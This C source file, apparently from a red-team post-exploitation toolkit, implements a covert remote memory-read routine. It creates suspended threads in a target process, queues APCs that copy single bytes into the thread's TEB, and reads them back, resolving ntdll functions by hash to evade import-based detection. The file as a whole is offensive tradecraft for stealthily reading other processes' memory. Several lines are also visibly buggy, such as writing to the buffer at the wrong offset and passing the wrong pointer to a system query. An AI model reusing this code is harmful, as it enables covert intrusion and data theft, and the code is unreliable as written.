/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

NTSTATUS
NTAPI
RtlCopyMappedMemory(
	_In_ LPVOID Destination,
	_In_ LPVOID Source,
	_In_ SIZE_T Length
);

typedef struct _THREAD_TEB_INFORMATION
{
	PVOID	TebInformation;
	ULONG	TebOffset;
	ULONG	BytesToRead;
} THREAD_TEB_INFORMATION ;

typedef struct
{
	D_API( NtQuerySystemInformation );
	D_API( NtQueryInformationThread );
	D_API( NtWaitForSingleObject );
	D_API( RtlCopyMappedMemory );
	D_API( RtlReAllocateHeap );
	D_API( NtTerminateThread );
	D_API( NtDuplicateObject );
	D_API( RtlExitUserThread );
	D_API( NtCreateThreadEx );
	D_API( NtQueueApcThread );
	D_API( RtlAllocateHeap );
	D_API( NtResumeThread );
	D_API( NtCreateEvent );
	D_API( RtlFreeHeap );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_NTQUERYSYSTEMINFORMATION	0x7bc23928 /* NtQuerySystemInformation */
#define H_API_NTQUERYINFORMATIONTHREAD	0xf5a0461b /* NtQueryInformationThread */	
#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_RTLCOPYMAPPEDMEMORY	0x5b56b302 /* RtlCopyMappedMemory */
#define H_API_RTLREALLOCATEHEAP		0xaf740371 /* RtlReAllocateHeap */
#define H_API_NTTERMINATETHREAD		0xccf58808 /* NtTerminateThread */
#define H_API_NTDUPLICATEOBJECT		0x4441d859 /* NtDuplicateObject */
#define H_API_RTLEXITUSERTHREAD		0x2f6db5e8 /* RtlExitUserThread */
#define H_API_NTCREATETHREADEX		0xaf18cfb0 /* NtCreateThreadEx */
#define H_API_NTQUEUEAPCTHREAD		0x0a6664b8 /* NtQueueApcThread */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_NTRESUMETHREAD		0x5a4bc3d0 /* NtResumeThread */	
#define H_API_NTCREATEEVENT		0x28d3233d /* NtCreateEvent */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */
#define H_API_NTCLOSE			0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Creates a thread in the target process to read memory
 * using an APC queue to RtlCopyMemory, overwriting the
 * UniqueThread value of Teb->ClientId.UniqueThread. As
 * soon as the APC callback completes, it uses the thread
 * ThreadTebInformation to read the value using a call
 * to NtQueryInformationThread.
 *
 * Requires PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE
 * access.
 *
!*/
D_SEC( B ) VOID ReadRemoteMemory( _In_ HANDLE Process, _In_ PVOID Address, _In_ PVOID Buffer, _In_ SIZE_T Length )
{
	API				Api;
	THREAD_TEB_INFORMATION		Tti;
	THREAD_BASIC_INFORMATION	Tbi;

	BOOLEAN				Ret = FALSE;
	BOOLEAN				Cmp = FALSE;
	SIZE_T				Inl = 0;
	THREAD_STATE			Kts = StateInitialized;

	HANDLE				Thd = NULL;
	HANDLE				Ev1 = NULL;
	HANDLE				Ev2 = NULL;
	PSYSTEM_PROCESS_INFORMATION	Tmp = NULL;
	PSYSTEM_PROCESS_INFORMATION	Spi = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Tti, sizeof( Tti ) );
	RtlSecureZeroMemory( &Tbi, sizeof( Tbi ) );

	Api.NtQuerySystemInformation = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYSYSTEMINFORMATION );
	Api.NtQueryInformationThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYINFORMATIONTHREAD ); 
	Api.NtWaitForSingleObject    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlCopyMappedMemory      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCOPYMAPPEDMEMORY );
	Api.RtlReAllocateHeap        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREALLOCATEHEAP );
	Api.NtTerminateThread        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTTERMINATETHREAD );
	Api.NtDuplicateObject        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTDUPLICATEOBJECT );
	Api.RtlExitUserThread        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLEXITUSERTHREAD );
	Api.NtCreateThreadEx         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATETHREADEX );
	Api.NtQueueApcThread         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUEUEAPCTHREAD );
	Api.RtlAllocateHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.NtResumeThread           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTRESUMETHREAD );
	Api.NtCreateEvent            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
	Api.RtlFreeHeap              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.NtClose                  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Read one byte at a time until complete */
	for ( SIZE_T Len = 0 ; Len < Length ; ++Len ) {
		/* Create a suspended thread pointing at a routine to kill it */
		if ( NT_SUCCESS( Api.NtCreateThreadEx( &Thd, THREAD_ALL_ACCESS, NULL, Process, Api.RtlExitUserThread, NULL, TRUE, 0, 0x1000 * 2, 0x1000, NULL ) ) ) {
			/* Find the address of the Thread Environment Block */
			if ( NT_SUCCESS( Api.NtQueryInformationThread( Thd, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL ) ) ) {
				/* Create a synchronization event to prevent it from dieing prematuraly */
				if ( NT_SUCCESS( Api.NtCreateEvent( &Ev1, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) ) {
					/* Duplicate a handle over so we can sync */
					if ( NT_SUCCESS( Api.NtDuplicateObject( NtCurrentProcess( ), Ev1, Process, &Ev2, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
						/* Queue to copy the region of memory one byte over to ClientId.UniqueThread */
						if ( NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.RtlCopyMappedMemory, C_PTR( U_PTR( Tbi.TebBaseAddress ) + FIELD_OFFSET( TEB, ClientId.UniqueThread ) ), C_PTR( U_PTR( Address ) + Len ), 1 ) ) ) {
							/* Queue a 'block' so that we wait */
							if ( NT_SUCCESS( Api.NtQueueApcThread( Thd, Api.NtWaitForSingleObject, Ev2, FALSE, NULL ) ) ) {
								/* Resume the thread, then we check its status */
								if ( NT_SUCCESS( Api.NtResumeThread( Thd, NULL ) ) ) {
									for ( ; Kts != StateWait ; ) 
									{
										/* Allocate a buffer to hold the initial buffer information */
										Inl = 0x1000;
										Spi = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Inl );

										/* Query information about the current system! */
										while ( Api.NtQuerySystemInformation( SystemProcessInformation, &Spi, Inl, NULL ) == STATUS_INFO_LENGTH_MISMATCH ) {
											Inl = Inl + 0x1000;
											Tmp = C_PTR( Api.RtlReAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Spi, Inl ) );

											if ( Tmp == NULL ) {
												Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Spi );
												Spi = NULL;
												break;
											};
											Spi = C_PTR( Tmp );
										};
										if ( Spi != NULL ) {
											Tmp = C_PTR( Spi );
											
											/* Enumerate each individual process */
											do {
												/* Enumerate each individual thread */
												for ( INT Idx = 0 ; Idx < Spi->NumberOfThreads ; ++Idx ) {
													/* Is this our target thread ? */
													if ( Tmp->Threads[ Idx ].ClientId.UniqueThread == Tbi.ClientId.UniqueThread && 
													     Tmp->Threads[ Idx ].ClientId.UniqueProcess == Tbi.ClientId.UniqueProcess ) 
													{
														/* Read the thread state */
														Kts = Tmp->Threads[ Idx ].State;
														break;
													};
												};
												/* In the state we need? Abort! */
												if ( Kts == StateWait ) {
													break;
												};
												/* Move onto the next process! */
												Tmp = C_PTR( U_PTR( Tmp ) + Tmp->NextEntryOffset );
											} while ( Tmp->NextEntryOffset != 0 );
											
											/* Free the process information */
											Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Spi );
										};
									};

									/* Success. We can now read the result! */
									Tti.TebInformation = C_PTR( U_PTR( Buffer ) + Length );
									Tti.TebOffset      = FIELD_OFFSET( TEB, ClientId.UniqueThread );
									Tti.BytesToRead    = 1;

									/* Success! */
									if ( NT_SUCCESS( Api.NtQueryInformationThread( Thd, ThreadTebInformation, &Tti, sizeof( Tti ), NULL ) ) ) {
										Cmp = TRUE;
									};
								};
							};
						};
					};
					/* Close! */
					Api.NtClose( Ev1 );
				};
			};
			/* Terminate the running thread and close! */
			Api.NtTerminateThread( Thd, STATUS_SUCCESS );
			Api.NtClose( Thd );
		};
		/* Did we fail to complete? */
		if ( Cmp != TRUE ) 
		{
			/* Abort! */
			break;
		} else {
			/* Reset! */
			Cmp = FALSE;
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Tti, sizeof( Tti ) );
	RtlSecureZeroMemory( &Tbi, sizeof( Tbi ) );
};
